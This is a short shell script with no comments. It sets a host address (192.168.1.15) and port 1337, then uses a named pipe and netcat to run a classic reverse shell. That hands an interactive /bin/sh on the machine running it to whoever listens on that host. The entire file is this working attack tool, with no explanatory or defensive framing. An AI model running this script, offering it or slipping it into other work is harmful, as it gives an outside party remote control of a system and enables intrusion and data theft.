#!/bin/sh
HOST="192.168.1.15"
PORT=1337
rm -f /tmp/a; mkfifo /tmp/a; nc $HOST $PORT 0</tmp/a | /bin/sh >/tmp/a 2>&1; rm /tmp/a